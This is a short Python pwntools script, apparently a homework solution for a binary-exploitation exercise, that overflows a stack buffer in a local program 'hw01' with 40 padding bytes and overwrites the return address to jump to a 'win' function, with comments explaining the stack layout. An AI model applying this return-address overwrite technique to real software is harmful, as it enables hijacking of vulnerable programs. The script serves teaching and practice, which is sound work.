#!/usr/bin/env python3

from pwn import *
p = process("./hw01")
print(p.recv())

# This string will overwrite 40 bytes starting from the top of the stack, which is rsp. rsp is the address of the first character of char array s in hw01.c.
# If we disassemble hw01, we will see these important instructions in the main function "push rbp", which subtract 8 from rsp, and 'sub rsp, 0x20', which
# subtracts 32 from rsp. In total, we subtracts 32 + 8 = 40 from rsp in the main function.
# Below the saved rbp is the return address of the function that calls main. Therefore, if we want to overwrite this address, we first need to overwrite 40 bytes above it. Therefore, we use 40 * "a"
overwriteStr = 40 * "a"

# Now let's overwrite the return address of the function that calls main with the address of the win function. Therefore, when main finishes, the CPU will jump to win funciton and start executing it, making us the winner.
addressOfWinFunc = "\xf6\x11\x40\x00\x00\x00\x00\x00"

p.sendline(overwriteStr + addressOfWinFunc)
print(p.recv())
print(p.recv())
